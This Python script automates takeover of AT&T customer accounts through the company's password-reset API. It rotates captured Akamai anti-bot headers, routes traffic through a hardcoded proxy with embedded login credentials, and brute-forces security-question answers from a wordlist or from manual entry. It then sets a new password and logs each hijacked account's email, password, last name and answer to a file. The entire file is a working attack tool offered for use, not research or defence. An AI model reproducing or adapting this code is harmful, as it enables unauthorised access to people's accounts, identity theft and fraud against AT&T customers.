import re
import json, sqlite3
import os.path
import random, string
import time
import tls_client

this_ts = time.time()

def dict_factory(cursor, row):
	d = {}
	for idx, col in enumerate(cursor.description):
		d[col[0]] = row[idx]
	return d
con = sqlite3.connect('db.db')
con.row_factory = dict_factory
cur = con.cursor()

cur.execute('''CREATE TABLE IF NOT EXISTS akamai_headers(
	id INTEGER PRIMARY KEY AUTOINCREMENT,
	headers TEXT,
	user_agent TEXT,
	sec_ch_ua TEXT,
	sec_ch_ua_platform TEXT,
	att_convid TEXT,
	create_date INTEGER,
	usages INTEGER DEFAULT 0,
	fails INTEGER DEFAULT 0
)''')


def check_password(p: str) -> bool:
	return (
		len(p) >= 8 and
		any(c.isdigit() for c in p) and
		any(c.isupper() for c in p) and
		any(c.islower() for c in p) and
		p.isascii()
	)

def generate_password(length=12):
	chars = string.ascii_letters + string.digits
	while True:
		password = ''.join(random.choices(chars, k=length))
		if (any(c.isdigit() for c in password) and
			any(c.isupper() for c in password) and
			any(c.islower() for c in password)):
			return password


# noinspection PyBroadException
def save_to_file(file_path: str, text: str):
	open(file_path, 'a', encoding='utf-8').write(text)

# noinspection PyBroadException
class att():
	def __init__(self):
		self.ses = tls_client.Session(random_tls_extension_order=True)
		self.reset_session()
		self.session_storage = {
			'file_with_answers': '',
			'answers_to_check': []
		}
		self.retries_per_acc = 0
		self.restarts_per_acc = 0
		self.last_akamai_log = 0

		self.file_path_save = 'changed_password.txt'
		self.file_path_error = 'error_on_set_password.txt'

		self.email = None
		self.last_name = None
		self.att_token = None
		self.att_cid = None
		self.methods = None

		self.questions = None
		self.selected_question = None
		self.selected_question_id = None
		self.selected_mode = None
		self.answer = None
		self.new_password = None

		self.akamai_headers= None
		self.current_state = None # create_cookies, send_email, get_methods, search_answer, set_password

		self.running_in_row = False # Is auto check


	def reset_session(self):
		self.ses = tls_client.Session(random_tls_extension_order=True)
		self.ses.proxies = {
			'http': 'http://jack83sas:redtarede812Dawee_country-US@142.202.220.242:27759',
			'https': 'http://jack83sas:redtarede812Dawee_country-US@142.202.220.242:27759'
		}

	def collect_akamai_headers(self):
		if not os.path.exists('curls.txt'):
			open('curls.txt', 'w', encoding='utf-8').close()
			return

		with open('curls.txt', 'r', encoding='utf-8') as f:
			text = f.read()
			if 'json{"' in text:
				content_type = 'json'
				data = text.split('json{"')
			else:
				content_type = 'curl'
				data = text.split("curl ")


		open('curls.txt', 'w', encoding='utf-8').close()

		v = 0
		for this_head in data:
			if content_type == 'json':
				try:
					this_json: dict = json.loads('{"'+this_head)
					user_agent = this_json.get('user-agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36')
					sec_ch_ua_raw = this_json.get('sec-ch-ua', '"Not)A;Brand";v="8", "Chromium";v="138", "Google Chrome";v="138"')
					sec_ch_ua_platform_raw = this_json.get('sec-ch-ua-platform', '"Windows"')
					att_convid = this_json.get('x-att-conversationid', 'HALOILM~unauthenticated~41c6baba-b35d-46d9-bfba-fd798d7cbf01')

					sec_ch_ua = sec_ch_ua_raw.replace('\\"', '"')
					sec_ch_ua_platform = sec_ch_ua_platform_raw.replace('\\"', '"')

					headers = {key.lower(): value for key, value in this_json.items() if '-iozyazcd-' in key}

					cur.execute('''
						INSERT INTO akamai_headers(headers, user_agent, sec_ch_ua, sec_ch_ua_platform, att_convid, create_date) 
						VALUES (?, ?, ?, ?, ?, ?)
					''', [
						json.dumps(headers),
						user_agent,
						sec_ch_ua,
						sec_ch_ua_platform,
						att_convid,
						int(time.time())
					])
					v += 1
				except json.decoder.JSONDecodeError:
					continue

			elif content_type == 'curl':
				pattern = r"-H (?:'|\$')x-iozyazcd-([a-z0-9]+): ([^']+)'"
				matches = re.findall(pattern, this_head, re.IGNORECASE)
				if len(matches) > 2:
					try:
						user_agent = re.findall(r"-H (?:'|\$')user-agent: ([^']+)'", this_head, re.IGNORECASE)[0]
						sec_ch_ua_raw = re.findall(r"-H (?:'|\$')sec-ch-ua: ([^']+)'", this_head, re.IGNORECASE)[0]
						sec_ch_ua_platform_raw = re.findall(r"-H (?:'|\$')sec-ch-ua-platform: ([^']+)'", this_head, re.IGNORECASE)[0]
						try: att_convid = re.findall(r"-H (?:'|\$')x-att-conversationid: ([^']+)'", this_head, re.IGNORECASE)[0]
						except:
							att_convid = 'HALOILM~unauthenticated~41c6baba-b35d-46d9-bfba-fd798d7cbf01'

						sec_ch_ua = sec_ch_ua_raw.replace('\\"', '"')
						sec_ch_ua_platform = sec_ch_ua_platform_raw.replace('\\"', '"')

						headers = {key.lower(): value for key, value in matches}

						cur.execute('''
							INSERT INTO akamai_headers(headers, user_agent, sec_ch_ua, sec_ch_ua_platform, att_convid, create_date) 
							VALUES (?, ?, ?, ?, ?, ?)
						''', [
							json.dumps(headers),
							user_agent,
							sec_ch_ua,
							sec_ch_ua_platform,
							att_convid,
							int(time.time())
						])
						v += 1
					except IndexError:
						continue
			else:
				print('[-] Invalid content_type')

		if v > 0:
			con.commit()
			print(f'[+] Collected {v} akamai headers')


	def get_akamai_headers_count(self):
		cur.execute('SELECT COUNT(*) as total_records FROM akamai_headers')
		result = cur.fetchone()
		return result.get('total_records', 0)

	def get_akamai_headers(self):
		cur.execute('SELECT * FROM akamai_headers ORDER BY fails ASC')
		result = cur.fetchone()
		if not result:
			return None
		result['headers'] = json.loads(result['headers'])
		cur.execute('UPDATE akamai_headers SET usages = usages + 1 WHERE id = ?', [result['id']])
		con.commit()
		return result

	def update_akamai_headers(self, id: int):
		cur.execute('UPDATE akamai_headers SET fails = fails + 1 WHERE id = ?', [id])
		con.commit()

	def delete_akamai_headers(self, id: int = None):
		if id:
			cur.execute('DELETE FROM akamai_headers WHERE id = ?', [id])
		else:
			cur.execute('DELETE FROM akamai_headers WHERE fails > 3')
		con.commit()

	def create_cookies(self, is_goto: bool = False):
		self.current_state = 'create_cookies'
		cookies = {
			'c_d_state': 'AAAAEH-mYx-kizlOJCCfdbV_xweLp-nme8VCk_KQWTBs5yL94kAwP7FSiY6ShJ21kgWm5Xq3nHA5Q0JU1l0h_Dpgv4BtWcZ586zWPxd4xhtDouyAKOJuNOml2yKHfOpKHuapNzvsT2y60tH0FRcnUD0A5YpFVIxT4asYOjvWkaJN4frJ5iWIghqW0sEIllw6zaQehw1unWl0t6nr7DqosRTHqKfqHE1frtugYMPXwn8HrZA9964BHMkvQr-PJRXmsNKgTO-iUXwgcuRvtrCNoNOR8WI2aOCKSyAlAACDU0MROG3lrvVqKp4RRZ2JSdzs0rr_ugPCBOFCFL43-iYvXNlupuDPhNfmHL-Gr4GJqF3VrMUYs2AaWs6PApVqeOjHjuiAJ28l8f4JrvNusESjsc7TSERcGZDjxZ-3clEGVaJ4RPFDWheKQ6BfaOTpqsQimKz4vww3K8E4Wk3XBcGhTxdhn_6kbcw1rWkoQRwRxATpVnDM3OPcVqOVr35Zs-BYEI7VTfixCdJpHtVWAuV2F11_wdzdnOwRGCr4-lPb59G2h9nw_zYO-9X2ip2mB801ndB0V_wiLF0MG7Frvzcqe-8bTHj2Np__lfotG58J9bhTYgf8fMLL7w--80fB8IotG7DV7T4vJoGZaFQbETpOxto95LsbfQEAz33u',
		}
		req = self.ses.get(
			'https://identity.att.com/identity-ui/fpwd/lander',
			cookies=cookies,
			params={
				'origination_point': 'tguard',
				'trid': 'dc509f2dc34f559139f41e58b13c37650906de2a',
				'appName': 'm14186',
				'Return_URL': 'https://oidc.idp.clogin.att.com/mga/sps/oauth/oauth20/authorize?response_type=id_token&client_id=m14186&redirect_uri=https%3A%2F%2Fwww.att.com%2Fmsapi%2Flogin%2Funauth%2Fservice%2Fv1%2Fhaloc%2Foidc%2Fredirect&state=from%3Dnx&scope=openid&response_mode=form_post&nonce=XH64kLDx',
				'Cancel_URL': 'https://oidc.idp.clogin.att.com/mga/sps/oauth/oauth20/authorize?response_type=id_token&client_id=m14186&redirect_uri=https%3A%2F%2Fwww.att.com%2Fmsapi%2Flogin%2Funauth%2Fservice%2Fv1%2Fhaloc%2Foidc%2Fredirect&state=from%3Dnx&scope=openid&response_mode=form_post&nonce=XH64kLDx',
				'lang': 'en-us',
			},
			headers={
				'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
				'accept-language': 'ru-RU,ru;q=0.9',
				'priority': 'u=0, i',
				'referer': 'https://signin.att.com/',
				'sec-ch-ua': '"Not)A;Brand";v="8", "Chromium";v="138"',
				'sec-ch-ua-mobile': '?0',
				'sec-ch-ua-platform': '"Windows"',
				'sec-fetch-dest': 'document',
				'sec-fetch-mode': 'navigate',
				'sec-fetch-site': 'same-site',
				'sec-fetch-user': '?1',
				'upgrade-insecure-requests': '1',
				'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
			},
		)
		print(f'create_cookies: {req.status_code}')
		return 'success'


	def send_email(self, is_goto: bool = False, id_collision: bool = False):
		self.current_state = 'send_email'

		if self.selected_mode == 1 and len(self.session_storage['answers_to_check']) == 0: # Empty file
			self.session_storage['file_with_answers'], self.session_storage['answers_to_check'] = '', []
			print(f'[-] All lines was used from {self.session_storage["file_with_answers"]} for {self.email}, question number {self.selected_question_id}')
			return 'change_creds'

		if self.last_akamai_log >= 6:
			print(f'Total akamai headers in db: {self.get_akamai_headers_count()}')
			self.last_akamai_log = 0
		self.last_akamai_log += 1

		if not id_collision:
			self.collect_akamai_headers()
			self.akamai_headers = self.get_akamai_headers()

			if not self.akamai_headers:
				print(f'[-] There is no akamai headers, add new to curls.txt')
				time.sleep(2)
				return 'retry'

		headers = {
			'accept': 'application/json, text/plain, */*',
			'accept-language': 'en-us',
			'appname': 'm14186',
			'content-type': 'application/json',
			'lang': 'en-us',
			'origin': 'https://identity.att.com',
			'priority': 'u=1, i',
			'referer': 'https://identity.att.com/identity-ui/fpwd/lander?origination_point=tguard&trid=dc509f2dc34f559139f41e58b13c37650906de2a&appName=m14186&Return_URL=https:%2F%2Foidc.idp.clogin.att.com%2Fmga%2Fsps%2Foauth%2Foauth20%2Fauthorize%3Fresponse_type%3Did_token%26client_id%3Dm14186%26redirect_uri%3Dhttps%253A%252F%252Fwww.att.com%252Fmsapi%252Flogin%252Funauth%252Fservice%252Fv1%252Fhaloc%252Foidc%252Fredirect%26state%3Dfrom%253Dnx%26scope%3Dopenid%26response_mode%3Dform_post%26nonce%3DXH64kLDx&Cancel_URL=https:%2F%2Foidc.idp.clogin.att.com%2Fmga%2Fsps%2Foauth%2Foauth20%2Fauthorize%3Fresponse_type%3Did_token%26client_id%3Dm14186%26redirect_uri%3Dhttps%253A%252F%252Fwww.att.com%252Fmsapi%252Flogin%252Funauth%252Fservice%252Fv1%252Fhaloc%252Foidc%252Fredirect%26state%3Dfrom%253Dnx%26scope%3Dopenid%26response_mode%3Dform_post%26nonce%3DXH64kLDx&lang=en-us',
			'sec-ch-ua': self.akamai_headers['sec_ch_ua'],
			'sec-ch-ua-mobile': '?0',
			'sec-ch-ua-platform': self.akamai_headers['sec_ch_ua_platform'],
			'sec-fetch-dest': 'empty',
			'sec-fetch-mode': 'cors',
			'sec-fetch-site': 'same-origin',
			'user-agent': self.akamai_headers['user_agent'],
			'userid': self.email,
			'verify-session-token': '',
			'x-att-conversationid': self.akamai_headers['att_convid']
		}
		for k, v in self.akamai_headers['headers'].items():
			headers[f'x-iozyazcd-{k}' if len(k) == 1 else k] = v

		if id_collision:
			headers['X-Att-Token'] = self.att_token
			headers['referer'] = 'https://identity.att.com/identity-ui/fpwd/multipleidfound'

		while True:
			try:
				req = self.ses.post(
					'https://identity.att.com/identity-api/password-management-services/v1/unauth/id-inquiry',
					headers=headers,
					json={
						'userId': self.email,
						'companyId': '5',
						'lastName': self.last_name,
						'returnUrl': 'https://oidc.idp.clogin.att.com/mga/sps/oauth/oauth20/authorize?response_type=id_token&client_id=m14186&redirect_uri=https%3A%2F%2Fwww.att.com%2Fmsapi%2Flogin%2Funauth%2Fservice%2Fv1%2Fhaloc%2Foidc%2Fredirect&state=from%3Dnx&scope=openid&response_mode=form_post&nonce=XH64kLDx',
						'cancelUrl': 'https://oidc.idp.clogin.att.com/mga/sps/oauth/oauth20/authorize?response_type=id_token&client_id=m14186&redirect_uri=https%3A%2F%2Fwww.att.com%2Fmsapi%2Flogin%2Funauth%2Fservice%2Fv1%2Fhaloc%2Foidc%2Fredirect&state=from%3Dnx&scope=openid&response_mode=form_post&nonce=XH64kLDx',
					},
					timeout_seconds=10
				)
				break
			except Exception as e:
				print(f'error on send_email{"-id_collision" if id_collision else ""}: {type(e)}')
				return 'retry'
		if req.status_code != 200:
			self.reset_session()
			if self.retries_per_acc >= 3:
				self.delete_akamai_headers()
				self.update_akamai_headers(self.akamai_headers['id'])
				print(f'[-] Invalid last name or change proxy - if wont help = akamai')
				return 'change_creds'
			self.retries_per_acc += 1
			print(f'send_email{"-id_collision" if id_collision else ""}: {req.status_code}')
			return 'retry'
		self.retries_per_acc = 0
		print(f'[+] send_email{"-id_collision" if id_collision else ""}: {req.status_code}')
		self.att_token = req.headers['X-Att-Token']
		self.att_cid = req.headers['X-Att-Conversationid']
		if 'IdInquiryCollision' in req.text:
			return self.send_email(id_collision=True)

		return 'success'

	def get_methods(self, is_goto: bool = False):
		self.current_state = 'get_methods'
		headers = {
			'Host': 'identity.att.com',
			'Sec-Ch-Ua-Platform': '"Windows"',
			'Lang': 'en-us',
			'Accept-Language': 'en-us',
			'Sec-Ch-Ua': '"Not)A;Brand";v="8", "Chromium";v="138"',
			'Sec-Ch-Ua-Mobile': '?0',
			'X-Att-Conversationid': self.att_cid,
			'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
			'Appname': 'm14186',
			'Userid': self.email,
			'Accept': 'application/json, text/plain, */*',
			'X-Att-Token': self.att_token,
			'Sec-Fetch-Site': 'same-origin',
			'Sec-Fetch-Mode': 'cors',
			'Sec-Fetch-Dest': 'empty',
			'Referer': 'https://identity.att.com/identity-ui/fpwd/lander?lang=en-us&cancel_url=https:%2F%2Foidc.idp.clogin.att.com%2Fmga%2Fsps%2Foauth%2Foauth20%2Fauthorize%3Fresponse_type%3Did_token%26client_id%3Dm14186%26redirect_uri%3Dhttps%253A%252F%252Fwww.att.com%252Fmsapi%252Flogin%252Funauth%252Fservice%252Fv1%252Fhaloc%252Foidc%252Fredirect%26state%3Dfrom%253Dnx%26scope%3Dopenid%26response_mode%3Dform_post%26nonce%3DT7D41d9F&return_url=https:%2F%2Foidc.idp.clogin.att.com%2Fmga%2Fsps%2Foauth%2Foauth20%2Fauthorize%3Fresponse_type%3Did_token%26client_id%3Dm14186%26redirect_uri%3Dhttps%253A%252F%252Fwww.att.com%252Fmsapi%252Flogin%252Funauth%252Fservice%252Fv1%252Fhaloc%252Foidc%252Fredirect%26state%3Dfrom%253Dnx%26scope%3Dopenid%26response_mode%3Dform_post%26nonce%3DT7D41d9F&appName=m14186&trID=98e3c3d68c2373d32e6b57664b7ba2dc6a1f3a17',
			'Priority': 'u=1, i',
		}
		while True:
			try:
				req = self.ses.get(
					'https://identity.att.com/identity-api/password-management-services/v1/unauth/delivery/methods',
					headers=headers,
						timeout_seconds=10
				)
				break
			except Exception as e:
				print(f'error on get_fa_methods: {type(e)}')
				return 'retry'
		print(f'get_fa_methods: {req.status_code}{" - "+req.text[:20] if req.status_code != 200 else ""}')
		self.att_token = req.headers['X-Att-Token']
		self.att_cid = req.headers['X-Att-Conversationid']
		self.methods = req.json()
		return 'success'

	def select_mode_method(self, is_goto: bool = False):
		if self.selected_mode != 1:
			methods = self.methods.get('methods')[0]
			self.questions = methods.get('SQA', [])
			questions_text = [f"{i}. {q['methodValue']}" for i, q in enumerate(self.questions, start=1)]
			questions_ids = {i: q for i, q in enumerate(self.questions, start=1)}
			print('[+] Questions:\n'+'\n'.join(questions_text)+'\n')

			# SELECT QUESTION
			selected_question_id = input(f'[+] Select question for answering: ').strip()
			while True:
				n = ''.join([str(x) for x in range(0, len(self.questions)+1)])
				if selected_question_id not in n:
					print(f'[-] Selected question must be just one number from these - "{n}" not "{selected_question_id}"')
					continue
				selected_question_id = int(selected_question_id)
				break
			selected_question = questions_ids[selected_question_id]
			self.selected_question = selected_question
			self.selected_question_id = selected_question_id

			# SELECT MODE
			while True:
				mode = input('\n1. File - you select 1 question and it takes answers from .txt file\n2. Manually - you select 1 question and manually entering answer\n3. AI - you select 1 question and its guessing\n4. Skip account.\n\n[+] Select mode: ').strip()[0]
				if mode not in list('1234') or not mode.isdigit():
					print(f'[-] Mode must be 1 or 2 or 3 or 4 not "{mode}"\n')
					continue
				mode = int(mode)
				if mode == 1:
					file_path = input(f"\nSelected question:\n{selected_question_id}. {selected_question['methodValue']}\n[+] Enter path to .txt file with answers (1 line = 1 answer): ").strip().replace('"','')
					if not os.path.exists(file_path):
						print('[-] Invalid file path')
						continue
					self.session_storage['file_with_answers'] = file_path
					self.session_storage['answers_to_check'] = open(file_path, 'r', encoding='utf-8').read().splitlines()
					if len(self.session_storage['answers_to_check']) == 0: # Empty file
						self.session_storage['file_with_answers'], self.session_storage['answers_to_check'] = '', []
						print('[-] Empty file')
						continue
					print(f'[+] Loaded {len(self.session_storage["answers_to_check"])} answers')
				if mode == 4:
					return 'skip'
				self.selected_mode = mode
				break
		return 'success'

	def search_answer(self, is_goto: bool = False):
		self.current_state = 'search_answer'
		found_answer = False
		retries = 0
		while retries < 6:
			if self.selected_mode == 1: # File
				if len(self.session_storage['answers_to_check']) == 0:
					print(f'[-] All lines was used from {self.session_storage["file_with_answers"]} for {self.email}, question number {self.selected_question_id}')
					self.clear_session()
					return 'all_lines_used'
				answer = self.session_storage['answers_to_check'].pop(0)
				self.sync_session()
				print(f'[+] Selected answer: {answer}')
			elif self.selected_mode == 2: # Manually
				answer = input(f'\n{self.selected_question_id}. {self.selected_question["methodValue"]}\n[{retries+1}] Enter answer: ').strip()
			elif self.selected_mode == 3: # AI
				print(f'[-] Not working atm, select manually mode')
				return 'select_mode'
			else:
				print(f'[-] Invalid mode')
				return 'skip'
			answers = [[self.selected_question['methodId'], answer] for _ in self.questions]
			payload_answers = {}
			for i, answer in enumerate(answers, start=1):
				if answer[1] == '':
					continue
				payload_answers[f'sqid{i}'] = answer[0]
				payload_answers[f'sa{i}'] = answer[1]
			while True:
				try:
					req = self.ses.post(
						'https://identity.att.com/identity-api/password-management-services/v1/unauth/delivery/method',
						headers={
							'accept': 'application/json, text/plain, */*',
							'accept-language': 'en-us',
							'appname': 'm14186',
							'cache-control': 'no-cache',
							'content-type': 'application/json',
							'lang': 'en-us',
							'origin': 'https://identity.att.com',
							'pragma': 'no-cache',
							'priority': 'u=1, i',
							'referer': 'https://identity.att.com/identity-ui/fpwd/answersecurityquestions',
							'sec-ch-ua': '"Not)A;Brand";v="8", "Chromium";v="138", "Google Chrome";v="138"',
							'sec-ch-ua-mobile': '?0',
							'sec-ch-ua-platform': '"Windows"',
							'sec-fetch-dest': 'empty',
							'sec-fetch-mode': 'cors',
							'sec-fetch-site': 'same-origin',
							'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36',
							'userid': self.email,
							'x-att-conversationid': self.att_cid,
							'x-att-token': self.att_token,
						}, json={
							'method': 'SQA',
							**payload_answers
						},
						timeout_seconds=10
					)
					break
				except Exception as e:
					print(f'error on search_answer: {type(e)}')
					return 'retry'
			retries += 1
			if 'PMS_FAILURE' in req.text:
				print(f'[-] Need to create new token cuz error')
				return 'retry'
			if req.status_code in [200, 201]:
				print(f'[+] Valid answer ({req.status_code}{" - "+req.text[:30] if req.status_code != 201 else ""})\n')
				self.answer = answer[1]
				found_answer = True
			else:
				print(f'[-] Invalid answer ({req.status_code}{" - "+req.text[:20] if req.status_code != 400 else ""})\n')
			self.att_token = req.headers['X-Att-Token']
			self.att_cid = req.headers['X-Att-Conversationid']
			if found_answer: break
		if not found_answer:
			print(f'[-] Answer wasn\'t found, creating new token')
			return 'retry'
		return 'success'

	def set_password(self, is_goto: bool = False):
		self.current_state = 'set_password'
		while True:
			new_password = input(f'[+] Enter new password for {self.email} (Empty=Randomly generated): ').strip()
			if new_password == "":
				new_password = generate_password()
				print(f'[+] Generated password: {new_password}')
			if check_password(new_password):
				self.new_password = new_password
				break
			else:
				print(f'\n[-] Password must be at least 8 digit, 1 big letter, 1 number')
				continue
		while True:
			try:
				req = self.ses.post(
					'https://identity.att.com/identity-api/password-management-services/v1/unauth/set-password',
					headers={
						'Host': 'identity.att.com',
						'Sec-Ch-Ua-Platform': '"Windows"',
						'Lang': 'en-us',
						'Accept-Language': 'en-us',
						'Sec-Ch-Ua': '"Not)A;Brand";v="8", "Chromium";v="138"',
						'Sec-Ch-Ua-Mobile': '?0',
						'X-Att-Conversationid': self.att_cid,
						'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
						'Appname': 'm14186',
						'Userid': self.email,
						'Content-Type': 'application/json',
						'Accept': 'application/json, text/plain, */*',
						'X-Att-Token': self.att_token,
						'Origin': 'https://identity.att.com',
						'Sec-Fetch-Site': 'same-origin',
						'Sec-Fetch-Mode': 'cors',
						'Sec-Fetch-Dest': 'empty',
						'Referer': 'https://identity.att.com/identity-ui/fpwd/lander/preset',
						'Priority': 'u=1, i',
					}, json={
						'companyId': '5',
						'password': self.new_password,
					}
				)
				break
			except Exception as e:
				print(f'error on set_password: {type(e)}')
				return 'retry'
		if 'PMS_SUCCESS' in req.text:
			print(f'[+] Password was successfully reset: {self.email}:{self.new_password}\n')
			save_to_file(self.file_path_save, f'{self.email}:{self.new_password}:{self.last_name}:{self.selected_question_id}:{self.answer}\n')
		else:
			print(f'[-] Error on set-password request: {req.status_code} - {req.text}\n')
			save_to_file(self.file_path_error, f'{self.email}:NOT_SET-ERROR:{self.last_name}:{self.selected_question_id}:{self.answer}\n')
		self.clear_session()
		return 'success'

	def sync_session(self):
		os.makedirs('session', exist_ok=True)
		open('session/answers_to_check.txt', 'w', encoding='utf-8').write('\n'.join(self.session_storage['answers_to_check']))
		session_info = {
			"email": self.email,
			"last_name": self.last_name,
			"questions": self.questions,
			"selected_question": self.selected_question,
			"selected_question_id": self.selected_question_id,
			"selected_mode": self.selected_mode,
			"answer": self.answer,
			"new_password": self.new_password,
			"state": self.current_state,
			"file_with_answers": self.session_storage['file_with_answers'],
			"run_ts": this_ts
		}
		open('session/session.json', 'w', encoding='utf-8').write(json.dumps(session_info))

	def clear_session(self):
		self.remove_files('session/session.json', 'session/answers_to_check.txt')

	def resume_session(self):
		os.makedirs('session', exist_ok=True)
		if os.path.exists('session/session.json'):
			with open('session/session.json', 'r', encoding='utf-8') as f1:
				session_info = json.loads(f1.read())
			with open('session/answers_to_check.txt', 'r', encoding='utf-8') as f1:
				answers_to_check = f1.read().splitlines()
			if session_info.get('run_ts', None) != this_ts:
				to_resume = input(f'[+] Found not finished session\nEmail: {session_info["email"]} | Last name: {session_info["last_name"]} | Lines to check: {len(answers_to_check)}\nDo u want to resume this session (Y/N): ').lower().strip()
				if to_resume == '':
					to_resume = 'y'
			else:
				to_resume = 'y'

			if to_resume == 'y':
				self.running_in_row = True
				self.email = session_info['email']
				self.last_name = session_info['last_name']
				self.questions = session_info['questions']
				self.selected_question = session_info['selected_question']
				self.selected_question_id = session_info['selected_question_id']
				self.selected_mode = session_info['selected_mode']
				self.answer = session_info['answer']
				self.new_password = session_info['new_password']
				self.current_state = session_info['state']
				self.session_storage['answers_to_check'] = answers_to_check
				self.session_storage['file_with_answers'] = session_info.get('file_with_answers', '')
				self.sync_session()
				return True
			else:
				self.remove_files('session/session.json', 'session/answers_to_check.txt')
				return False

	def remove_files(self, *files):
		for x in files:
			try:
				if os.path.exists(x):
					os.remove(x)
			except Exception as e: ...


if __name__ == "__main__":
	while True:
		client = att()
		need_resume = client.resume_session()
		if not need_resume:
			email = input('Enter email: ').strip().lower()
			last_name = input('Enter last name: ').strip().lower()
		else:
			email, last_name = client.email, client.last_name

		while True:
			client.email = email
			client.last_name = last_name

			# Send email
			result = client.send_email()
			if result == 'success': ...
			elif result == 'change_creds': break
			elif result == 'retry':
				print('retrying')
				continue


			# Get methods
			result = client.get_methods()
			if result == 'success': ...


			# Select mode and check method
			result = client.select_mode_method()
			if result == 'success': ...
			elif result == 'skip': break


			# Search answer
			result = client.search_answer()
			if result == 'success': ...
			elif result == 'all_lines_used': break #goto = 'select_mode_method'
			elif result == 'select_mode': break #goto = 'select_mode_method'
			elif result == 'skip': break
			elif result == 'retry': continue


			# Set password
			result = client.set_password()
			if result == 'success': break
			break